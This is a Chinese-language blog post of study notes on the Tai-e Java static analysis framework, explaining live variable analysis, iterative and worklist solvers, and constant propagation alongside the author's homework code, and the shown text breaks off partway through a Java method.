    <content type="html"><![CDATA[<h1 id="软件分析基础知识-amp-作业"><a href="#软件分析基础知识-amp-作业" class="headerlink" title="软件分析基础知识&amp;作业"></a>软件分析基础知识&amp;作业</h1><p>&emsp;之前翔哥给我具体讲了讲软件分析的基础知识，翔哥的链接如下所示：</p><p>[1] <a href="https://xym4ster.github.io/post/Program-Analysis-01">https://xym4ster.github.io/post/Program-Analysis-01</a></p><p>[2] <a href="https://xym4ster.github.io/post/Program-Analysis-02">https://xym4ster.github.io/post/Program-Analysis-02</a></p><p>[3] <a href="https://xym4ster.github.io/post/Program-Analysis-03">https://xym4ster.github.io/post/Program-Analysis-03</a></p><p>[4] <a href="https://xym4ster.github.io/post/Program-Analysis-04">https://xym4ster.github.io/post/Program-Analysis-04</a></p><p>[5] <a href="https://xym4ster.github.io/post/Program-Analysis-05">https://xym4ster.github.io/post/Program-Analysis-05</a></p><span id="more"></span><h2 id="0x00-tai-e基本知识"><a href="#0x00-tai-e基本知识" class="headerlink" title="0x00 tai-e基本知识"></a>0x00 tai-e基本知识</h2><p>&emsp;<strong>Tai-e 是一个分析 Java 程序的静态程序分析框架</strong>，相比于已有的知名静态程序分析框架（如 Soot、Wala 等），<strong>Tai-e 要易学易用</strong>。Tai-e分为教学版/科研版，它们在分析能力和性能上有较大差距。</p><p>&emsp;作业涵盖多种静态分析技术，包括编译优化（活跃变量分析、常量传播分析、死代码检测），基础程序分析（程序调用图构建、非上下文敏感指针/别名分析、各类经典上下文敏感指针/别名分析），以及程序分析在软件安全性的应用（污点分析）。</p><p>&emsp;<code>tai-e 利用 Soot 前端解析 Java 程序并帮助构建 Tai-e IR。Soot 有两个前端，分别处理 Java 源代码文件（</code>.java<code>）和字节码文件（</code>.class<code>）。其中，前者可以将源代码中的变量名保留至 IR 中，从而使得生成的 IR 更贴近源码，比后者的更易于理解，即tai-e可以输入java源代码文件或者字节码文件，都可以输出IR，但是输入java源代码文件更好。</code></p><p>&emsp;实验作业中，待分析的程序都以 Java 源文件的格式提供。然而，Soot 的 Java 源文件前端已经过时（最高 Java 7 版本）且不够健壮。Soot 的字节码文件前端更加健壮（最高 Java 17 版本编译生成的 <code>.class</code> 文件）。分析真实世界的程序时，往往使用字节码。</p><h2 id="0x01-活跃变量分析与迭代求解器"><a href="#0x01-活跃变量分析与迭代求解器" class="headerlink" title="0x01 活跃变量分析与迭代求解器"></a>0x01 活跃变量分析与迭代求解器</h2><h3 id="活跃变量分析基本原理"><a href="#活跃变量分析基本原理" class="headerlink" title="活跃变量分析基本原理"></a>活跃变量分析基本原理</h3><p>&emsp;见<a href="https://xym4ster.github.io/post/Program-Analysis-02">Link</a>。</p><h3 id="代码相关的知识点"><a href="#代码相关的知识点" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><ul><li><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code></li></ul><p>&emsp;抽象的数据流分析类，是具体的数据流分析与求解器之间的接口，即具体的数据流分析（如活跃变量分析）需要实现它的接口，而求解器（如迭代求解器）需要通过它的接口来求解数据流。分析方向、边界条件、初始条件、meet 操作、transfer 函数。</p><ul><li><code>pascal.taie.ir.exp.Exp</code></li></ul><p>&emsp;表示程序中的所有表达式。它含有很多子类，对应各类具体的表达式。在 Tai-e 的 IR 中，把表达式分为两类：LValue 和 RValue。有些表达式既可用于左值，也可用于右值，就比如Var。</p><ul><li><code>pascal.taie.ir.stmt.Stmt</code></li></ul><p>&emsp;表示程序中的所有语句。<code>每个表达式都属于某条特定的语句</code>。每条语句至多只可能定义一个变量、而可能使用零或多个变量。</p><ul><li><code>pascal.taie.analysis.dataflow.fact.SetFact&lt;Var&gt;</code></li></ul><p>&emsp;此泛型类用于把 data fact 组织成一个集合。它提供了各种集合操作，如添加、删除元素，取交集、并集等。<code>data fact就是每一个basic block的输入，例如活跃变量分析，需要用0/1代表某变量是否是活跃的。</code></p><ul><li><code>pascal.taie.analysis.dataflow.fact.DataflowResult</code></li></ul><p>&emsp;维护数据流分析的 CFG 中的 fact，可以通过它的 API 获取、设置 CFG 节点的 <code>IN facts</code> 和 <code>OUT facts</code>。</p><ul><li><code>pascal.taie.analysis.graph.cfg.CFG</code></li></ul><p>&emsp;表示程序中方法的控制流图（control-flow graphs）。可以通过一个for循环遍历其中的所有节点。</p><ul><li><code>pascal.taie.analysis.dataflow.solver.Solver</code></li></ul><p>&emsp;这是数据流分析求解器的基类，包含了求解器的抽象功能。Tai-e 会构建待分析程序的 CFG 并传给 <code>Solver.solve(CFG)</code>，这个类中有两组initialize/doSolve方法，分别处理前向和后向的数据流分析。</p><h3 id="作业代码"><a href="#作业代码" class="headerlink" title="作业代码"></a>作业代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LiveVariableAnalysis.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SetFact&lt;Var&gt; <span class="title function_">newBoundaryFact</span><span class="params">(CFG&lt;Stmt&gt; cfg)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SetFact&lt;Var&gt; <span class="title function_">newInitialFact</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meetInto</span><span class="params">(SetFact&lt;Var&gt; fact, SetFact&lt;Var&gt; target)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fact.isEmpty())</span><br><span class="line">        target.union(fact);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferNode</span><span class="params">(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out)</span> &#123;</span><br><span class="line">    Optional&lt;LValue&gt; def = stmt.getDef();</span><br><span class="line">    SetFact&lt;Var&gt; result = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">    Collection&lt;RValue&gt; use = stmt.getUses();</span><br><span class="line"></span><br><span class="line">    SetFact&lt;Var&gt; left = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line">    SetFact&lt;Var&gt; right = <span class="keyword">new</span> <span class="title class_">SetFact</span>&lt;Var&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (RValue u: use) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u <span class="keyword">instanceof</span> Var)</span><br><span class="line">            left.add((Var)u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!out.isEmpty()) &#123;</span><br><span class="line">        right = out.copy();</span><br><span class="line">        <span class="keyword">if</span> (def.isPresent()) &#123;</span><br><span class="line">            <span class="type">LValue</span> <span class="variable">tmp</span> <span class="operator">=</span> def.get();</span><br><span class="line">            <span class="keyword">if</span> (tmp <span class="keyword">instanceof</span> Var)</span><br><span class="line">                right.remove((Var)tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result.union(left);</span><br><span class="line">    result.union(right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.equals(in)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        in.set(result);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Solver.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initializeBackward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">exit</span> <span class="operator">=</span> cfg.getExit();</span><br><span class="line">    result.setInFact(exit, analysis.newBoundaryFact(cfg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line">        result.setInFact(n, analysis.newInitialFact());</span><br><span class="line">        result.setOutFact(n, analysis.newInitialFact());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IterativeSolver.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doSolveBackward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">change</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (change) &#123;</span><br><span class="line">        change = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Fact</span> <span class="variable">fact</span> <span class="operator">=</span> result.getOutFact(n);</span><br><span class="line">            <span class="keyword">for</span> (Node suc: cfg.getSuccsOf(n)) &#123;</span><br><span class="line">                <span class="type">Fact</span> <span class="variable">tmp</span> <span class="operator">=</span> result.getInFact(suc);</span><br><span class="line">                analysis.meetInto(tmp, fact);</span><br><span class="line">            &#125;</span><br><span class="line">            result.setOutFact(n, fact);</span><br><span class="line"></span><br><span class="line">            <span class="type">Fact</span> <span class="variable">in_fact</span> <span class="operator">=</span> result.getInFact(n);</span><br><span class="line">            <span class="type">Fact</span> <span class="variable">out_fact</span> <span class="operator">=</span> result.getOutFact(n);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">tmp</span> <span class="operator">=</span> analysis.transferNode(n, in_fact, out_fact);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp)</span><br><span class="line">                change = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-常量传播和-Worklist-求解器"><a href="#0x02-常量传播和-Worklist-求解器" class="headerlink" title="0x02 常量传播和 Worklist 求解器"></a>0x02 常量传播和 Worklist 求解器</h2><h3 id="常量传播基本原理"><a href="#常量传播基本原理" class="headerlink" title="常量传播基本原理"></a>常量传播基本原理</h3><p>&emsp;程序的P点有一个变量x，判断在P点是否可以保证x是一个常量。</p><p>&emsp;<strong>Iterative Algorithm都是前驱的block先merge完，再将结果输入到后面的block。而Worklist Algorithm是先把前驱block的输出输入到要分析的block，然后将要分析的block的输出统一merge。</strong>如下图所示，Worklist Algorithm更准：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204001241.png" alt="image-20231122204001241" style="zoom:67%;" /></p><p>&emsp;<code>上一段话纯属一派胡言，经过查证，Worklist Algorithm与Iterative Algorithm与如何merge无关。</code>从下面的算法流程图来看，上图的差异应该体现在$\mathrm{IN}[B]=\bigsqcup_{P\text{ a predecessor of }B}\mathsf{OUT}[P]$这一步，如果是$\operatorname{F}(X\cap Y)$，那么$\mathrm{IN}[B]$应该是${(a,NAC),(b,NAC)}$；如果是$\mathrm{F}({X})\cap\mathrm{F}({Y})$，那么$\mathrm{IN}[B]$应该是${(a,1),(a,9),(b,1),(b,9)}$；</p><p>&emsp;如果使用Iterative Algorithm分析常量传播，那么转换函数以及相应标注如下：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204345729.png" alt="image-20231122204345729" style="zoom:67%;" /></p><p>&emsp;最终的算法结构如下（与活跃变量分析不同）：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122204435289.png" alt="image-20231122204435289" style="zoom:67%;" /></p><p>&emsp;此算法不好的点是：如果有任意OUT变化了，所有的block都要重新计算。而对应的Worklist Algorithm为：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231122210036239.png" alt="image-20231122210036239" style="zoom:67%;" /></p><p><code>为什么活跃变量分析是backward的，而常量分析是forward的呢？</code></p><p>&emsp;在某个点的变量是否活跃，是由后面的程序决定的。而在某个点的定义是否是常量，是由前面的程序决定的。</p><p><code>May Analysis 与 Must Analysis</code></p><p>&emsp;May Analysis的初始fact为0，最终找出有哪些不是0的fact。例如Reaching Definitions Analysis，其意思是：<code>假设有程序点p与q，在p点定义了变量x，且从p到q之间没有再定义x，那么说x的定值到达了p在此环境下，fact=0代表不可到达，fact=1代表可到达，我们想找不可达的，这样的话就可以把对应的语句删掉。May Analysis，程序满足一条路径即可。</code></p><p>&emsp;Must Analysis的初始fact为1，最终找出不是1的fact。例如Constant Propagation，其意思是：<code>有程序点p与q，在q点定义了变量x，在q点使用了变量x，q点之前，再没有分支重新定义变量x，那么fact=1代表可常量传播，fact=0代表不可常量传播，我们想找可常量传播的，这样的话就可以传播常量。Must Analysis，程序必须满足所有路径。</code></p><h3 id="代码相关的知识点-1"><a href="#代码相关的知识点-1" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><p>&emsp;由于在java中，boolean/byte/char/short等类型在运行时都以int的形式进行计算，因此实现int类型的常量传播即可。其他的数据类型可以忽略。</p><p>&emsp;只需要关注以下3种语句：（1）常量，x=1；（2）变量，x=y；（3）二元运算表达式，x=a+b或者x=a&gt;&gt;b等等。其中二元运算如下：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231123201511693.png" alt="image-20231123201511693" style="zoom:67%;" /></p><p>&emsp;对于逻辑运算符（与或），请详细看作业中的描述，就是将逻辑运算符转为语义等价的语句，并且进行处理。对于方法调用，字段load而言，进行保守的近似处理，即当作<code>x=NAC</code>。对于字段存储等其他语句而言，只需要使用恒等函数作为transfer函数即可。</p><ul><li><code>pascal.taie.ir.IR</code>。</li></ul><p>&emsp;每个实例存储了一个java方法的各种信息，例如变量、参数、语句。</p><ul><li><code>pascal.taie.ir.exp.Exp</code>。</li></ul><p>&emsp;其有很多子类，其中<code>pascal.taie.ir.exp.Var</code>代表IR中的变量，<code>pascal.taie.ir.exp.IntLiteral</code>代表程序中的整数常量。<code>pascal.taie.ir.exp.BinaryExp</code>代表程序中的二元表达式，它有很多子类，每个子类代表上表中支持的运算符，且<code>BinaryExp</code> 的两个操作数都是 <code>Var</code> 类型的。</p><ul><li><code>pascal.taie.ir.stmt.DefinitionStmt</code>。</li></ul><p>&emsp;stmt的子类，表示程序中所有赋值语句。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code>。</li></ul><p>&emsp;其中有具体数据流分析算法需要实现的接口，会被求解器调用。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.Value</code>。</li></ul><p>&emsp;分析格上的抽象值，例如<code>getNAC()</code>返回 NAC，<code>getUndef()</code> 返回UNDEF，<code>makeConstant(int)</code>返回给定整数在格上对应的抽象值。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.CPFact</code>。</li></ul><p>&emsp;表示常量传播中的 data facts，即一个从变量（<code>Var</code>）到格上抽象值（<code>Value</code>）的映射。</p><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.ConstantPropagation</code>。</li></ul><p>&emsp;实现了 <code>DataflowAnalysis</code>。</p><h3 id="作业代码-1"><a href="#作业代码-1" class="headerlink" title="作业代码"></a>作业代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// solver.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initializeForward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    <span class="type">Node</span> <span class="variable">entry</span> <span class="operator">=</span> cfg.getEntry();</span><br><span class="line">    <span class="type">Fact</span> <span class="variable">cp_fact</span> <span class="operator">=</span> analysis.newBoundaryFact(cfg);</span><br><span class="line">    <span class="comment">// inFact and outFact all need set</span></span><br><span class="line">    result.setOutFact(entry, cp_fact);</span><br><span class="line">    result.setInFact(entry, cp_fact);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cfg.isEntry(n)) &#123;</span><br><span class="line">            result.setInFact(n, analysis.newInitialFact());</span><br><span class="line">            result.setOutFact(n, analysis.newInitialFact());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WorkListSolver.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doSolveForward</span><span class="params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Node n: cfg)</span><br><span class="line">        queue.offer(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// pick basic block B from Worklist</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">        <span class="comment">// IN[B] = UNION(OUT[P])</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="keyword">for</span> (Node pred: cfg.getPredsOf(cur)) &#123;</span><br><span class="line">            <span class="type">Fact</span> <span class="variable">tmp</span> <span class="operator">=</span> result.getOutFact(pred);</span><br><span class="line">            analysis.meetInto(tmp, fact);</span><br><span class="line">        &#125;</span><br><span class="line">        result.setInFact(cur, fact);</span><br><span class="line">        <span class="comment">// OUT[B] = genB UNION (IN[B]-killB)</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">in_fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="type">Fact</span> <span class="variable">out_fact</span> <span class="operator">=</span> result.getOutFact(cur);</span><br><span class="line">        changed = analysis.transferNode(cur, in_fact, out_fact);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (changed)</span><br><span class="line">            <span class="keyword">for</span> (Node succ: cfg.getSuccsOf(cur))</span><br><span class="line">                <span class="keyword">if</span> (!queue.contains(succ))</span><br><span class="line">                    queue.offer(succ);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConstantPropagation.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CPFact <span class="title function_">newBoundaryFact</span><span class="params">(CFG&lt;Stmt&gt; cfg)</span> &#123;</span><br><span class="line">    <span class="comment">// point to function args</span></span><br><span class="line">    List&lt;Var&gt; vs = cfg.getIR().getParams();</span><br><span class="line">    <span class="type">CPFact</span> <span class="variable">cp_fact</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CPFact</span>();</span><br><span class="line">    <span class="keyword">for</span> (Var v: vs) &#123;</span><br><span class="line">        <span class="keyword">if</span>(canHoldInt(v)) &#123;</span><br><span class="line">            cp_fact.update(v, Value.getNAC());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cp_fact;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CPFact <span class="title function_">newInitialFact</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CPFact</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meetInto</span><span class="params">(CPFact fact, CPFact target)</span> &#123;</span><br><span class="line">    Set&lt;Var&gt; keyset = fact.keySet();</span><br><span class="line">    <span class="keyword">if</span> (!keyset.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Var k: keyset) &#123;</span><br><span class="line">            <span class="type">Value</span> <span class="variable">v1</span> <span class="operator">=</span> fact.get(k);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">v2</span> <span class="operator">=</span> target.get(k);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">result</span> <span class="operator">=</span> meetValue(v1, v2);</span><br><span class="line">            target.update(k, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Value <span class="title function_">meetValue</span><span class="params">(Value v1, Value v2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (v1.isNAC() || v2.isNAC())</span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v2.isUndef())</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isUndef())</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isConstant() &amp;&amp; v2.isConstant() &amp;&amp; v1.getConstant() != v2.getConstant())</span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v1.isConstant() &amp;&amp; v2.isConstant() &amp;&amp; v1.getConstant() == v2.getConstant())</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Value.getNAC();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">transferNode</span><span class="params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;</span><br><span class="line">    <span class="comment">// focus on definition (x = .. | x = m(..))</span></span><br><span class="line">    <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> 